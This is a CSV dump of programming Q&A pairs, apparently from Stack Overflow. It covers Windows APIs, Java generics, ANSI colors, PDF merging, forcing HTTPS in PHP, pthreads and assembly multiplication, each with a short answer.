QUESTION,USERID,USERNAME,ANSWER
"<p>Windows file system is case insensitive. How, given a file/folder name (e.g. ""somefile""), I get the <em>actual</em> name of that file/folder (e.g. it should return ""SomeFile"" if Explorer displays it so)?</p>

<p>Some ways I know, all of which seem quite backwards:</p>

<ol>
<li>Given the full path, search for each folder on the path (via FindFirstFile). This gives proper cased results of each folder. At the last step, search for the file itself.</li>
<li>Get filename from handle (as in <a href=""http://msdn.microsoft.com/en-us/library/aa366789(VS.85).aspx"">MSDN example</a>). This requires opening a file, creating file mapping, getting it's name, parsing device names etc. Pretty convoluted. And it does not work for folders or zero-size files.</li>
</ol>

<p>Am I missing some obvious WinAPI call? The simplest ones, like GetActualPathName() or GetFullPathName() return the name using casing that was passed in (e.g. returns ""program files"" if that was passed in, even if it should be ""Program Files"").</p>

<p>I'm looking for a native solution (not .NET one).</p>
","9530","Adam Rosenfield","<p>After a quick test, <a href=""http://msdn.microsoft.com/en-us/library/aa364980(VS.85).aspx"" rel=""nofollow"">GetLongPathName()</a> does what you want.</p>
"
"<p>Is it possible to create an instance of a generic type in Java? I'm thinking based on what I've seen that the answer is <code>no</code> (<em>due to type erasure</em>), but I'd be interested if anyone can see something I'm missing:</p>

<pre><code>class SomeContainer&lt;E&gt;
{
    E createContents()
    {
        return what???
    }
}
</code></pre>

<p>EDIT: It turns out that <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=208860"">Super Type Tokens</a> could be used to resolve my issue, but it requires a lot of reflection-based code, as some of the answers below have indicated.</p>

<p>I'll leave this open for a little while to see if anyone comes up with anything dramatically different than Ian Robertson's <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=208860"">Artima Article</a>.</p>
","9530","Adam Rosenfield","<p>As you said, you can't really do it because of type erasure.  You can sort of do it using reflection, but it requires a lot of code and lot of error handling.</p>
"
"<p>I am trying to solve numerically a set of partial differential equations in three dimensions. In each of the equations the next value of the unknown in a point depends on the current value of each unknown in the closest points.</p>

<p>To write an efficient code I need to keep the points close in the three dimensions close in the (one-dimensional) memory space, so that each value is called from memory just once.</p>

<p>I was thinking of using octtrees, but I was wondering if someone knows a better method.</p>
","9530","Adam Rosenfield","<p>Octtrees are the way to go.  You subdivide the array into 8 octants:</p>

<pre>
1 2
3 4

---

5 6
7 8
</pre>

<p>And then lay them out in memory in the order 1, 2, 3, 4, 5, 6, 7, 8 as above.  You repeat this recursively within each octant until you get down to some base size, probably around 128 bytes or so (this is just a guess -- make sure to profile to determine the optimal cutoff point).  This has much, much better cache coherency and locality of reference than the naive layout.</p>
"
"<p>I have a command line program, which outputs logging to the screen.</p>

<p>I want error lines to show up in red. Is there some special character codes I can output to switch the text color to red, then switch it back to white?</p>

<p>I'm using ruby but I imagine this would be the same in any other language.</p>

<p>Something like:</p>

<pre><code>red = ""\0123"" # character code
white = ""\0223""

print ""#{red} ERROR: IT BROKE #{white}""
print ""other stuff""
</code></pre>
","9530","Adam Rosenfield","<p>You want <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code"" rel=""nofollow"">ANSI escape codes</a>.</p>
"
"<p>I have a costumer showing Notepad with a large set of data that looks totally misaligned if word wrap is on and I want to force it off. Is there a command switch to do this?</p>
","9530","Adam Rosenfield","<p>You could just use Wordpad instead of Notepad, it has word wrap off by default.</p>
"
"<p>It seems to be the <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82402"">general opinion</a> that tables should not be used for layout in HTML. </p>

<p>Why?</p>

<p>I have never (or rarely to be honest) seen good arguments for this. The usual answers are:</p>

<ul>
<li><p>It's good to <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82422"">separate content from layout</a><br>But this is a fallacious argument; <a href=""http://www.don-lindsay-archive.org/skeptic/arguments.html#cliche"">Cliche Thinking</a>. I guess it's true that using the table element for layout has little to do with tabular data. So what? Does my boss care? Do my users care?<br><br>Perhaps me or my fellow developers who have to maintain a web page care... Is a table less maintainable? I think using a table is <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82571"">easier</a> than using divs and CSS.<br><br>By the way... why is using a div or a span good separation of content from layout and a table not? Getting a good layout with only divs often requires a lot of nested divs.</p></li>
<li><p>Readability of the code<br>I think it's the other way around. Most people understand HTML, few understand CSS.</p></li>
<li><p>It's better for SEO not to use tables<br>Why? Can anybody show some evidence that it is? Or a statement from Google that tables are discouraged from an SEO perspective?</p></li>
<li><p>Tables are slower.<br>An extra tbody element has to be inserted. This is peanuts for modern web browsers. Show me some benchmarks where the use of a table significantly slows down a page.</p></li>
<li><p>A layout overhaul is easier without tables, see <a href=""http://csszengarden.com/"">css Zen Garden</a>.<br>Most web sites that need an upgrade need new content (HTML) as well. Scenarios where a new version of a web site only needs a new CSS file are not very likely. Zen Garden is a nice web site, but a bit theoretical. Not to mention its <a href=""http://stackoverflow.com/questions/83073/div-vs-table#83639"">misuse</a> of CSS.</p></li>
</ul>

<p>I am really interested in good arguments to use divs + CSS instead of tables.</p>
","9530","Adam Rosenfield","<p>Tables are good for HTML that you're throwing together for something simple or temporary.  If you're building a large-scale website, you should go with divs and CSS, since it will be easier to maintain over time as your website changes.</p>
"
"<p>I've seen this done in a few sites, an example is <a href=""http://www.artofadambetts.com/weblog/?p=169"" rel=""nofollow"">artofadambetts.com</a>. The scroll bar on the page scrolls only an element of the page, not the entire page. I looked at the source and havent't been able to figure it out yet. How is this done?</p>
","9530","Adam Rosenfield","<p>To put scroll bars on an element such as a div:</p>

<p><code>&lt;div style=""overflow-x: auto; overflow-y: auto;&gt;the content&lt;/div&gt;</code></p>

<p>If you only want a horizontal or vertical scroll bar, only use whichever of overflow-x and overflow-y you need.</p>
"
"<p>What interrupt would you hook from DOS to get the real-time clock?</p>
","9530","Adam Rosenfield","<p>Read up on the <a href=""http://en.wikipedia.org/wiki/Intel_8259"" rel=""nofollow"">Intel 8259</a> family of Programmable Interrupt Controllers.  According to this, it's interrupts 8 (master) and 112 (slave).  Here's a very technical document on the 8259A: <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/hardware/8259A.pdf"" rel=""nofollow"">http://pdos.csail.mit.edu/6.828/2008/readings/hardware/8259A.pdf</a></p>
"
"<p>Of course most languages have library functions for this, but suppose I want to do it myself.</p>

<p>Suppose that the float is given like in a C or Java program (except for the 'f' or 'd' suffix), for example ""<code>4.2e1</code>"", ""<code>.42e2</code>"" or simply ""<code>42</code>"". In general, we have the ""integer part"" before the decimal point, the ""fractional part"" after the decimal point, and the ""exponent"". All three are integers.</p>

<p><strong>It is easy to find and process the individual digits, but how do you compose them into a value of type <code>float</code> or <code>double</code> without losing precision?</strong></p>

<p>I'm thinking of multiplying the integer part with 10^<em>n</em>, where <em>n</em> is the number of digits in the fractional part, and then adding the fractional part to the integer part and subtracting <em>n</em> from the exponent. This effectively turns <code>4.2e1</code> into <code>42e0</code>, for example. Then I could use the <code>pow</code> function to compute 10^<em>exponent</em> and multiply the result with the new integer part. The question is, does this method guarantee maximum precision throughout?</p>

<p>Any thoughts on this?</p>
","9530","Adam Rosenfield","<p>If you want the most precise result possible, you should use a higher internal working precision, and then downconvert the result to the desired precision.  If you don't mind a few ULPs of error, then you can just repeatedly multiply by 10 as necessary with the desired precision.  I would avoid the pow() function, since it will produce inexact results for large exponents.</p>
"
"<p>I'm working on a game where I create a random map of provinces (a la Risk or Diplomacy).  To create that map, I'm first generating a series of semi-random points, then figuring the Delaunay triangulations of those points.  </p>

<p>With that done, I am now looking to create a Voronoi diagram of the points to serve as a starting point for the province borders.  My data at this point (no pun intended) consists of the original series of points and a collection of the Delaunay triangles.</p>

<p>I've seen a number of ways to do this on the web, but most of them are tied up with how the Delaunay was derived.  I'd love to find something that doesn't need to be integrated to the Delaunay, but can work based off the data alone.  Failing that, I'm looking for something comprehensible to a relative geometry newbie, as opposed to optimal speed.  Thanks!</p>
","9530","Adam Rosenfield","<p>The Voronoi diagram is just the dual graph of the Delaunay triangulation.  </p>

<ul>
<li>So, the edges of the Voronoi diagram are along the perpendicular bisectors of the edges of the Delaunay triangulation, so compute those lines.  </li>
<li>Then, compute the vertices of the Voronoi diagram by finding the intersections of adjacent edges.  </li>
<li>Finally, the edges are then the subsets of the lines you computed which lie between the corresponding vertices.  </li>
</ul>

<p>Note that the exact code depends on the internal representation you're using for the two diagrams.</p>
"
"<p>I have a series of PDFs named sequentially like so:</p>

<ul>
<li>01_foo.pdf</li>
<li>02_bar.pdf</li>
<li>03_baz.pdf</li>
<li>etc.</li>
</ul>

<p>Using Ruby, is it possible to combine these into one big PDF while keeping them in sequence? I don't mind installing any necessary gems to do the job.</p>

<p>If this isn't possible in Ruby, how about another language? No commercial components, if possible.</p>

<p><hr /></p>

<p><strong>Update:</strong> <a href=""http://stackoverflow.com/questions/85459/is-it-possible-to-combine-a-series-of-pdfs-into-one-using-ruby#85618"">Jason Navarrete's suggestion</a> lead to the perfect solution:</p>

<p>Place the PDF files needing to be combined in a directory along with <a href=""http://www.accesspdf.com/pdftk/"">pdftk</a> (or make sure pdftk is in your PATH), then run the following script:</p>

<pre><code>pdfs = Dir[""[0-9][0-9]_*""].sort.join("" "")
`pdftk #{pdfs} output combined.pdf`
</code></pre>

<p>Or I could even do it as a one-liner from the command-line:</p>

<pre><code>ruby -e '`pdftk #{Dir[""[0-9][0-9]_*""].sort.join("" "")} output combined.pdf`'
</code></pre>

<p>Great suggestion Jason, perfect solution, thanks. <strong>Give him an up-vote people</strong>.</p>
","9530","Adam Rosenfield","<p>You can do this by converting to PostScript and back.  PostScript files can be concatenated trivially.  For example, here's a Bash script that uses the Ghostscript tools ps2pdf and pdf2ps:</p>

<pre>
#!/bin/bash
for file in 01_foo.pdf 02_bar.pdf 03_baz.pdf; do
    pdf2ps $file - >> temp.ps
done

ps2pdf temp.ps output.pdf
rm temp.ps
</pre>

<p>I'm not familiar with Ruby, but there's almost certainly some function (might be called <code>system()</code> (just a guess)) that will invoke a given command line.</p>
"
"<p>I've got just one page that I want to force to be accessed as an HTTPS page (PHP on Apache). How do I do this without making the whole directory require HTTPS? Or, if you submit a form to an HTTPS page from an HTTP page, does it send it by HTTPS instead of HTTP?</p>

<p>Here is my example:</p>

<pre><code>http://www.example.com/some-page.php
</code></pre>

<p>I want it to only be accessed through:</p>

<pre><code>https://www.example.com/some-page.php
</code></pre>

<p>Sure, I can put all of the links to this page pointed at the HTTPS version, but that doesn't stop some fool from accessing it through HTTP on purpose...</p>

<p>One thing I thought was putting a redirect in the header of the PHP file to check to be sure that they are accessing the HTTPS version:</p>

<pre><code>if($_SERVER[""SCRIPT_URI""] == ""http://www.example.com/some-page.php""){
    header('Location: https://www.example.com/some-page.php');
}
</code></pre>

<p>But that can't be the right way, can it?</p>

<p>BTW, please pay no attention to the URL. I know that if it were actually a page where there was a shopping cart, etc., you would do it a different way. Think of it as a page from a site that sells one item for one price where you type in your credit card info to be submitted to a payment gateway on an external site for the express purpose of charging your card one time.</p>
","9530","Adam Rosenfield","<p>The way I've done it before is basically like what you wrote, but doesn't have any hardcoded values:</p>

<pre>if($_SERVER[""HTTPS""] != ""on"")
{
    header(""Location: https://"" . $_SERVER[""HTTP_HOST""] . $_SERVER[""REQUEST_URI""]);
    exit();
}</pre>
"
"<p>I'm wondering the <em>best</em> way to start a pthread that is a member of a C++ class? My own approach follows as an answer...</p>
","9530","Adam Rosenfield","<p>You have to bootstrap it using the void* parameter:</p>

<pre>class A
{
  static void* StaticThreadProc(void *arg)
  {
    return reinterpret_cast&lt;A*&gt;(arg)->ThreadProc();
  }

  void* ThreadProc(void)
  {
    // do stuff
  }
};

...

pthread_t theThread;
pthread_create(&theThread, NULL, &A::StaticThreadProc, this);</pre>
"
"<p>How would I go about...</p>

<ul>
<li><p>multiplying two 64-bit numbers </p></li>
<li><p>multiplying two 16-digit hexadecimal numbers </p></li>
</ul>

<p>...using Assembly Language. </p>

<p>I'm only allowed to use registers %eax, %ebx, %ecx, %edx, and the stack.</p>

<p>EDIT: Oh, I'm using ATT Syntax on the x86<br>
EDIT2: Not allowed to decompile into assembly...</p>
","9530","Adam Rosenfield","<p>Just do normal long multiplication, as if you were multiplying a pair of 2-digit numbers, except each ""digit"" is really a 32-bit integer.  If you're multiplying two numbers at addresses X and Y and storing the result in Z, then what you want to do (in pseudocode) is:</p>

<pre>Z[0..3] = X[0..3] * Y[0..3]
Z[4..7] = X[0..3] * Y[4..7] + X[4..7] * Y[0..3]</pre>

<p>Note that we're discarding the upper 64 bits of the result (since a 64-bit number times a 64-bit number is a 128-bit number).  Also note that this is assuming little-endian.  Also, be careful about a signed versus an unsigned multiply.</p>
"
"<p>I sometimes notice programs that crash on my computer with the error: ""pure virtual function call"".</p>

<p>How do these programs even compile when an object cannot be created of an abstract class?</p>
","9530","Adam Rosenfield","<p>They can result if you try to make a virtual function call from a constructor or destructor.  Since you can't make a virtual function call from a constructor or destructor (the derived class object hasn't been constructed or has already been destroyed), it calls the base class version, which in the case of a pure virtual function, doesn't exist.</p>

<pre>class Base
{
public:
    Base() { doIt(); }  // DON'T DO THIS
    virtual void doIt() = 0;
};

class Derived : public Base
{
    void doIt() {}
};

int main(void)
{
    Derived d;  // This will cause ""pure virtual function call"" error
}
</pre>
"
"<p>I have a Win32 TreeCtrl where the user can rename the tree labels. I process the TVN_ENDLABELEDIT message to do this.</p>

<p>In certain cases I need to change the text that the user entered. Basically the user can enter a short name during edit and I want to replace it with a longer text.</p>

<p>To do this I change the pszText member of the TVITEM struct I received during TVN_ENDLABELEDIT. I do a pointer replace here, as the original memory may be too small to do a simple strcpy like operation.</p>

<p>However I do not know how to deallocate the original pszText member. Basically because it's unknown if that was created with malloc() or new ... therefore I cannot call the appropriate deallocator. Obviously Win32 won't call the deallocator for the old pszText because the pointer has been replaced. So if I don't deallocate, there will be a memory leak.</p>

<p>Any idea how Win32 allocate these structs and what is the proper way to handle the above situation?</p>
","9530","Adam Rosenfield","<p>You don't want to directly edit the text in the TVITEM struct, the results are undefined.  Instead, use the TVM_SETITEM message, or equivalently, use the TreeView_SetItem() macro defined in windowsx.h.</p>
"
